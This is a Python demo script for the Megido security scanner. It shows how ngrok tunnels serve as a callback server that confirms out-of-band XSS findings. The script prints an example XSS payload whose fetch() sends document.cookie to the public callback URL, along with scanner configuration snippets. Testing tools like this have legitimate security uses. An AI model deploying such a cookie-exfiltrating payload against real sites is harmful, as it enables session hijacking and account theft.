#!/usr/bin/env python3
"""
Demo Script: Megido Scanner with ngrok Callback Verification

This script demonstrates how to use the Megido scanner with ngrok-powered
callback verification for out-of-band (OOB) XSS detection.

This feature was added in PR #110 and enables:
- Automatic ngrok tunnel setup for callback verification
- Proof of XSS exploitation through callback interactions
- Reduced false positives by verifying actual JavaScript execution

Usage:
    python demo_ngrok_scan.py

Requirements:
    - ngrok installed and configured (see installation steps below)
    - Python 3.8+
    - Megido dependencies installed

ngrok Installation:
    1. Download ngrok: https://ngrok.com/download
    2. Extract and install:
       Linux/macOS: sudo mv ngrok /usr/local/bin/
       Windows: Move ngrok.exe to C:\\Windows\\System32\\
    3. Sign up for free account: https://dashboard.ngrok.com/signup
    4. Get auth token: https://dashboard.ngrok.com/get-started/your-authtoken
    5. Configure: ngrok config add-authtoken YOUR_AUTH_TOKEN
    6. Test: ngrok http 8888
"""

import sys
import os
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

# Setup Django if available
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'megido_security.settings')
try:
    import django
    django.setup()
    HAS_DJANGO = True
except ImportError:
    HAS_DJANGO = False
    print("⚠️  Django not available - running in standalone mode")

from scanner.callback_manager import CallbackManager


def check_ngrok_installation():
    """Check if ngrok is installed and provide setup instructions if not."""
    print("=" * 70)
    print("Step 1: Checking ngrok Installation")
    print("=" * 70)
    print()
    
    if CallbackManager.check_ngrok_installed():
        print("✓ ngrok is installed and available")
        print()
        return True
    else:
        print("✗ ngrok is not installed")
        print()
        print(CallbackManager.get_ngrok_installation_instructions())
        return False


def demo_callback_manager_with_ngrok():
    """Demonstrate CallbackManager with ngrok integration."""
    print("=" * 70)
    print("Step 2: Starting Callback Server with ngrok")
    print("=" * 70)
    print()
    
    print("This demo will:")
    print("  1. Start a local HTTP server on port 8888")
    print("  2. Launch ngrok to create a public tunnel")
    print("  3. Display the public callback URL")
    print("  4. Show how to use it for XSS verification")
    print()
    
    # Get ngrok auth token from environment or prompt
    ngrok_token = os.environ.get('NGROK_AUTH_TOKEN')
    if not ngrok_token:
        print("⚠️  NGROK_AUTH_TOKEN not set in environment")
        print("   The ngrok tunnel may be rate-limited without authentication")
        print()
        print("   To set your auth token:")
        print("   $ export NGROK_AUTH_TOKEN='your_token_here'")
        print()
        print("   Or configure ngrok directly:")
        print("   $ ngrok config add-authtoken your_token_here")
        print()
        user_input = input("Continue without token? (y/N): ").strip().lower()
        if user_input != 'y':
            print("Exiting. Please configure ngrok and try again.")
            return False
        print()
    
    # Initialize callback manager
    print("Initializing CallbackManager...")
    manager = CallbackManager(port=8888)
    
    try:
        # Start server with ngrok
        print("Starting callback server with ngrok tunnel...")
        print("(This may take a few seconds...)")
        print()
        
        callback_url = manager.start_callback_server(
            use_ngrok=True,
            ngrok_auth_token=ngrok_token
        )
        
        print("✓ Callback server is running!")
        print()
        print(f"📡 Public Callback URL: {callback_url}")
        print()
        print("This URL can be used in XSS payloads to verify exploitation.")
        print()
        
        # Show example payload
        print("-" * 70)
        print("Example XSS Payload with Callback:")
        print("-" * 70)
        payload_id = "demo123"
        example_payload = f"""<script>
fetch('{callback_url}/{payload_id}?data=' + encodeURIComponent(document.cookie))
  .then(() => console.log('Callback sent'))
  .catch(e => console.error('Callback failed', e));
</script>"""
        print(example_payload)
        print()
        
        # Wait for user to test
        print("-" * 70)
        print("You can now:")
        print(f"  1. Visit the ngrok web interface: http://localhost:4040")
        print(f"  2. Test the callback URL in your browser: {callback_url}/{payload_id}")
        print("  3. Check for received callbacks")
        print()
        
        input("Press Enter to check for callbacks (or Ctrl+C to exit)...")
        print()
        
        # Check for interactions
        print("-" * 70)
        print("Callback Interactions Received:")
        print("-" * 70)
        
        interactions = manager.get_interactions()
        if interactions:
            print(f"✓ Received {len(interactions)} callback(s):")
            print()
            for i, interaction in enumerate(interactions, 1):
                print(f"Callback #{i}:")
                print(f"  Time: {interaction['timestamp']}")
                print(f"  Method: {interaction['method']}")
                print(f"  Path: {interaction['path']}")
                print(f"  Client IP: {interaction['client_ip']}")
                print()
        else:
            print("✗ No callbacks received yet")
            print("  Try accessing the callback URL in your browser:")
            print(f"  {callback_url}/{payload_id}")
            print()
        
        return True
        
    except RuntimeError as e:
        print(f"✗ Error: {e}")
        print()
        print("Please ensure ngrok is properly installed and configured.")
        return False
        
    except Exception as e:
        print(f"✗ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return False
        
    finally:
        # Cleanup
        print("-" * 70)
        print("Cleaning up...")
        manager.stop_callback_server()
        print("✓ Callback server stopped")
        print()


def demo_scanner_configuration():
    """Show how to configure the scanner with ngrok callback verification."""
    print("=" * 70)
    print("Step 3: Scanner Configuration for ngrok Callback Verification")
    print("=" * 70)
    print()
    
    print("To enable ngrok-powered callback verification in the scanner,")
    print("use the following configuration:")
    print()
    
    print("-" * 70)
    print("Configuration Example:")
    print("-" * 70)
    print("""
config = {
    # Enable callback verification
    'enable_callback_verification': True,
    
    # Enable ngrok tunnel for callbacks
    'callback_use_ngrok': True,
    
    # Optional: Provide ngrok auth token
    'callback_ngrok_token': 'YOUR_NGROK_AUTH_TOKEN',
    
    # Optional: Customize callback port (default: 8888)
    'callback_port': 8888,
    
    # Optional: Callback timeout in seconds (default: 30)
    'callback_timeout': 30,
    
    # Other scanner settings
    'enable_dom_testing': True,
    'browser_type': 'chrome',
    'headless': True,
}
""")
    print()
    
    print("-" * 70)
    print("Usage Example:")
    print("-" * 70)
    print("""
from scanner.scan_plugins.xss_scanner_plugin import XSSScannerPlugin

# Initialize scanner
scanner = XSSScannerPlugin()

# Configure for ngrok callback verification
config = {
    'enable_callback_verification': True,
    'callback_use_ngrok': True,
    'callback_ngrok_token': os.environ.get('NGROK_AUTH_TOKEN'),
}

# Scan target with callback verification
result = scanner.execute_attack(
    target_url='http://example.com/search?q=test',
    vulnerability_data={'parameter': 'q', 'method': 'GET'},
    config=config
)

# Check results
if result['success']:
    print(f"✓ Found {len(result['findings'])} VERIFIED XSS vulnerabilities")
    for finding in result['findings']:
        if finding.get('callback_verified'):
            print(f"  ✓ VERIFIED: {finding['url']}")
            print(f"    Callbacks: {len(finding['callback_interactions'])}")
else:
    print("✗ No verified XSS vulnerabilities found")
""")
    print()


def demo_environment_configuration():
    """Show how to configure environment variables for ngrok."""
    print("=" * 70)
    print("Step 4: Environment Configuration")
    print("=" * 70)
    print()
    
    print("You can configure ngrok callback verification using environment")
    print("variables in your .env file or shell:")
    print()
    
    print("-" * 70)
    print(".env Configuration:")
    print("-" * 70)
    print("""
# ngrok Authentication Token
NGROK_AUTH_TOKEN=your_ngrok_auth_token_here

# Enable callback verification
XSS_CALLBACK_VERIFICATION_ENABLED=true

# Use ngrok for callback tunneling
CALLBACK_USE_NGROK=true

# Callback server port (default: 8888)
CALLBACK_PORT=8888

# Callback timeout in seconds (default: 30)
XSS_CALLBACK_TIMEOUT=30
""")
    print()
    
    print("-" * 70)
    print("Shell Configuration:")
    print("-" * 70)
    print("""
# Linux/macOS
export NGROK_AUTH_TOKEN='your_token_here'
export CALLBACK_USE_NGROK=true

# Windows (PowerShell)
$env:NGROK_AUTH_TOKEN='your_token_here'
$env:CALLBACK_USE_NGROK='true'

# Windows (CMD)
set NGROK_AUTH_TOKEN=your_token_here
set CALLBACK_USE_NGROK=true
""")
    print()


def main():
    """Main demo function."""
    print()
    print("╔" + "═" * 68 + "╗")
    print("║" + " " * 15 + "Megido Scanner - ngrok Callback Demo" + " " * 17 + "║")
    print("║" + " " * 20 + "PR #110 Feature Demonstration" + " " * 19 + "║")
    print("╚" + "═" * 68 + "╝")
    print()
    
    print("This demo showcases the ngrok-powered callback verification feature")
    print("for out-of-band XSS detection in Megido scanner.")
    print()
    
    # Check installation
    if not check_ngrok_installation():
        print()
        print("=" * 70)
        print("Demo cannot continue without ngrok installation.")
        print("Please install ngrok and run this demo again.")
        print("=" * 70)
        return
    
    print()
    
    # Demo callback manager
    try:
        success = demo_callback_manager_with_ngrok()
        if not success:
            print()
            print("=" * 70)
            print("Demo encountered errors. Please check ngrok configuration.")
            print("=" * 70)
            return
    except KeyboardInterrupt:
        print()
        print("Demo interrupted by user.")
        return
    
    print()
    
    # Show configuration examples
    demo_scanner_configuration()
    
    print()
    
    # Show environment configuration
    demo_environment_configuration()
    
    print()
    print("=" * 70)
    print("Demo Complete!")
    print("=" * 70)
    print()
    print("Next Steps:")
    print("  1. Configure ngrok auth token (if not already done):")
    print("     $ ngrok config add-authtoken YOUR_TOKEN")
    print()
    print("  2. Set environment variable (optional):")
    print("     $ export NGROK_AUTH_TOKEN='your_token_here'")
    print()
    print("  3. Use callback verification in your scans:")
    print("     config = {")
    print("         'enable_callback_verification': True,")
    print("         'callback_use_ngrok': True,")
    print("     }")
    print()
    print("  4. Review the callback verification guides:")
    print("     - NGROK_CALLBACK_GUIDE.md (this feature)")
    print("     - XSS_CALLBACK_VERIFICATION_GUIDE.md (general callback verification)")
    print()
    print("For more information:")
    print("  - ngrok documentation: https://ngrok.com/docs")
    print("  - Megido callback manager: scanner/callback_manager.py")
    print()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()
        print("Demo interrupted by user. Exiting...")
    except Exception as e:
        print()
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
